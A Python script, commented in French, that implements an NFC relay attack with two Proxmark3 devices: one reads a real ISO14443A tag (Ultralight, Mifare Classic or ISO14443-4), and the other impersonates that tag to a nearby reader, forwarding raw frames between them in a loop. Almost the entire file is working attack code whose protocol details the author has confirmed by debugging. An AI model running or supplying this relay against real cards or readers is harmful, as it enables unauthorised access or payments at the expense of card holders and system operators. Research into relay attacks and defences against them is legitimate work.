#!/usr/bin/env python3
"""
NFC Relay Attack - Proxmark3 x2  (firmware Iceman v4.20728)
Architecture: Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur

Confirmé par debug :
  - CMD_HF_ISO14443A_READER avec flags=0x0001 (CONNECT seul) détecte le tag
  - status=255 est normal pour cette commande
  - iso14a_card_select_t : uid=data[0:uid_len], uid_len=data[10], atqa=data[11:13], sak=data[13]
"""

import serial
import struct
import time
import sys

# ── Constantes protocole PM3 ──────────────────────────────────────────────────
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50

CMD_PING                = 0x0109
CMD_HF_ISO14443A_READER = 0x0385
CMD_HF_ISO14443A_SIM    = 0x0381

# Flags ISO14443A - CONFIRMÉS par debug
ISO14A_CONNECT          = (1 << 0)   # 0x001  anticollision + select
ISO14A_NO_DISCONNECT    = (1 << 1)   # 0x002  garder le champ actif
ISO14A_RAW              = (1 << 3)   # 0x008  bytes bruts
ISO14A_APPEND_CRC       = (1 << 4)   # 0x010  CRC auto

DEFAULT_TIMEOUT = 5.0
RELAY_TIMEOUT   = 0.5

# ── Bas niveau ────────────────────────────────────────────────────────────────

def send_mix(ser, cmd, arg0=0, arg1=0, arg2=0, data=b'', label=''):
    payload   = struct.pack('<QQQ', arg0, arg1, arg2) + data
    length_ng = len(payload) & 0x7FFF   # ng_bit=0
    pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += payload
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    if label:
        print(f"  [{label}] >> cmd=0x{cmd:04X} arg0=0x{arg0:08X} arg1={arg1} data={data.hex()}")
    ser.write(pkt)
    ser.flush()


def send_ng_cmd(ser, cmd, data=b'', label=''):
    length_ng = (len(data) & 0x7FFF) | (1 << 15)
    pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += data
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    if label:
        print(f"  [{label}] >> cmd=0x{cmd:04X} data={data.hex()}")
    ser.write(pkt)
    ser.flush()


def read_response(ser, timeout=DEFAULT_TIMEOUT, label='', silent=False):
    deadline = time.time() + timeout
    raw = b''
    while len(raw) < 10:
        if time.time() > deadline:
            if label and not silent:
                print(f"  [{label}] << TIMEOUT ({len(raw)}/10)")
            return None
        c = ser.read(10 - len(raw))
        if c:
            raw += c

    magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', raw)
    length = length_ng & 0x7FFF
    ng_bit = (length_ng >> 15) & 1

    if magic != RESPONSENG_PREAMBLE_MAGIC:
        if not silent:
            print(f"  [{label}] << BAD MAGIC 0x{magic:08X}")
        ser.reset_input_buffer()
        return None

    payload = b''
    if length > 0:
        dl = time.time() + 3.0
        while len(payload) < length and time.time() < dl:
            payload += ser.read(length - len(payload))
    ser.read(2)  # postamble

    args = (0, 0, 0)
    data_out = payload
    if not ng_bit and len(payload) >= 24:
        args = struct.unpack('<QQQ', payload[:24])
        data_out = payload[24:]

    if label and not silent:
        print(f"  [{label}] << cmd=0x{cmd:04X} st={status} ng={ng_bit} "
              f"args=({args[0]},{args[1]},{args[2]}) len={len(data_out)} data={data_out[:20].hex()}")

    return {'cmd': cmd, 'status': status, 'ng': ng_bit,
            'args': args, 'data': data_out, 'payload': payload}

# ── Commandes haut niveau ─────────────────────────────────────────────────────

def ping(ser, label=''):
    d = bytes(range(32))
    send_ng_cmd(ser, CMD_PING, d)
    r = read_response(ser, timeout=3.0, silent=True)
    ok = r and r['data'] == d
    print(f"  [{label}] PING {'OK ✓' if ok else 'FAILED ✗'}")
    return ok


def connect_tag(ser, label=''):
    """
    Détecte et sélectionne le tag.
    Confirmé : flags=ISO14A_CONNECT (0x0001) seulement.
    status=255 est normal.
    Structure réponse : iso14a_card_select_t dans data (271 bytes)
      data[0:10]  = uid (padded)
      data[10]    = uid_len
      data[11:13] = atqa
      data[13]    = sak
    """
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=ISO14A_CONNECT,
             label=label)
    resp = read_response(ser, timeout=DEFAULT_TIMEOUT, label=label)
    if not resp:
        return None
    # status=255 = normal (pas une erreur ici)
    d = resp['data']
    if len(d) < 14:
        return None
    uid_len = d[10]
    uid     = d[0:uid_len]
    atqa    = d[11:13]
    sak     = d[13]
    return {'uid': uid, 'atqa': atqa, 'sak': sak}


def reconnect_tag(ser, label=''):
    """Reconnecte le tag sans couper le champ (pour la boucle relay)."""
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=ISO14A_CONNECT | ISO14A_NO_DISCONNECT,
             label=label)
    return read_response(ser, timeout=2.0, label=label, silent=True)


def raw_to_tag(ser, raw_bytes, label=''):
    """Envoyer bytes bruts au tag (champ actif, CRC ajouté auto)."""
    flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=flags,
             arg1=len(raw_bytes),
             data=raw_bytes,
             label=label)
    return read_response(ser, timeout=RELAY_TIMEOUT, label=label)

# ── Relay ─────────────────────────────────────────────────────────────────────

class NfcRelay:

    def __init__(self, mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0',
                 baudrate=115200, verbose=True):
        self.verbose = verbose
        print(f"[*] Mole  (tag side)    : {mole_port}")
        self.mole  = serial.Serial(mole_port,  baudrate=baudrate, timeout=0.05)
        print(f"[*] Proxy (reader side) : {proxy_port}")
        self.proxy = serial.Serial(proxy_port, baudrate=baudrate, timeout=0.05)
        time.sleep(0.3)
        self._flush()

    def _flush(self):
        self.mole.reset_input_buffer();  self.mole.reset_output_buffer()
        self.proxy.reset_input_buffer(); self.proxy.reset_output_buffer()

    def close(self):
        try: self.mole.close()
        except: pass
        try: self.proxy.close()
        except: pass

    def init(self):
        print("\n=== Vérification connexions ===")
        if not ping(self.mole, 'MOLE ') or not ping(self.proxy, 'PROXY'):
            return False

        print("\n[MOLE] Recherche du tag réel...")
        card = connect_tag(self.mole, 'MOLE')
        if not card:
            print("[MOLE] ERREUR : tag non détecté. Pose le tag sur le mole.")
            return False

        self.tag_uid  = card['uid']
        self.tag_atqa = card['atqa']
        self.tag_sak  = card['sak']
        print(f"[MOLE] Tag OK !")
        print(f"       UID  : {self.tag_uid.hex().upper()}")
        print(f"       ATQA : {self.tag_atqa.hex().upper()}")
        print(f"       SAK  : {self.tag_sak:02X}")

        # Détecter le type de carte pour la simulation
        sim_type = self._detect_sim_type()
        print(f"\n[PROXY] Démarrage simulation type={sim_type} UID={self.tag_uid.hex().upper()}...")

        uid_padded = self.tag_uid.ljust(10, b'\x00')[:10]
        send_mix(self.proxy, CMD_HF_ISO14443A_SIM,
                 arg0=sim_type,
                 arg1=0,
                 data=uid_padded,
                 label='PROXY')
        time.sleep(0.3)
        # Vider la réponse immédiate du proxy
        read_response(self.proxy, timeout=0.5, silent=True)
        print("[PROXY] Simulation active.")
        return True

    def _detect_sim_type(self):
        """Détecter le type de simulation selon ATQA/SAK."""
        sak = self.tag_sak
        # SAK=00 → Ultralight/NTAG (type 2)
        # SAK=08 → Mifare Classic 1K (type 1)
        # SAK=20 → ISO14443-4 (type 3)
        if sak == 0x00:
            return 2   # Ultralight
        elif sak == 0x08:
            return 1   # Mifare Classic 1K
        elif sak == 0x20:
            return 3   # ISO14443-4
        else:
            return 2   # défaut Ultralight

    def relay_loop(self):
        print("\n=== RELAY LOOP ===")
        print("Approche le téléphone du PROXY. Ctrl+C pour arrêter.\n")

        n = 0
        wait_count = 0

        try:
            while True:
                # Écouter le proxy : trame du lecteur ?
                resp = read_response(self.proxy, timeout=0.02, silent=True)

                if resp is None:
                    wait_count += 1
                    if wait_count % 300 == 0:
                        print("  [~] En attente du lecteur (téléphone)...")
                    continue

                wait_count = 0

                # Afficher tout ce qui arrive du proxy (debug)
                print(f"\n  [PROXY RAW] cmd=0x{resp['cmd']:04X} st={resp['status']} "
                      f"ng={resp['ng']} args={resp['args']} "
                      f"data={resp['data'][:24].hex()}")

                # Extraire la trame du lecteur
                frame = self._extract_frame(resp)
                if not frame:
                    continue

                n += 1
                print(f"\n=== Échange #{n} ===")
                print(f"  LECTEUR -> PROXY : {frame.hex()}")

                # Forward au tag via mole
                tag_resp = raw_to_tag(self.mole, frame,
                                      label='MOLE' if self.verbose else '')
                if tag_resp and tag_resp['data']:
                    tag_frame = tag_resp['data']
                    print(f"  TAG    -> MOLE   : {tag_frame.hex()}")
                    self._reply_to_reader(tag_frame)
                    print(f"  PROXY  -> LECTEUR: {tag_frame.hex()}")
                else:
                    print(f"  TAG    -> MOLE   : (pas de réponse)")

        except KeyboardInterrupt:
            print("\n\n[RELAY] Arrêt propre.")

    def _extract_frame(self, resp):
        d = resp['data']
        if d and len(d) > 0 and d != bytes(len(d)):
            return d
        if not resp['ng'] and len(resp['payload']) > 24:
            rest = resp['payload'][24:]
            if rest and rest != bytes(len(rest)):
                return rest
        return None

    def _reply_to_reader(self, data):
        flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
        send_mix(self.proxy, CMD_HF_ISO14443A_READER,
                 arg0=flags,
                 arg1=len(data),
                 data=data)
        read_response(self.proxy, timeout=0.05, silent=True)

    def run(self):
        print("\n" + "=" * 62)
        print("  NFC RELAY ATTACK  |  Proxmark3 x2  |  Iceman firmware")
        print("  Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur")
        print("=" * 62)

        if not self.init():
            return
        self.relay_loop()


if __name__ == '__main__':
    relay = NfcRelay(
        mole_port  = '/dev/ttyACM1',
        proxy_port = '/dev/ttyACM0',
        verbose    = True
    )
    try:
        relay.run()
    finally:
        relay.close()
        print("[*] Ports fermés.")
        